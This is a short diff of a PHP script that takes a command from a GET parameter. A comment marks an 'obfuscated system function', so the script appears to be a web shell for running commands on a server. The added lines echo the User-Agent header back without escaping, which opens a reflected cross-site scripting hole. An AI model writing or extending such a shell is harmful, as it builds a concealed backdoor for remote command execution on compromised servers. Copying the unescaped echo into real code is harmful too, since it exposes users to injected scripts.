@@ -7,7 +7,10 @@ try {
         throw new Exception("Input parameter not provided! <a>");
     }
 
-    
+
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    echo "User-Agent: $userAgent\n";
+
     $input = $_GET[$cmd];
 
     // Obfuscated 'system' function
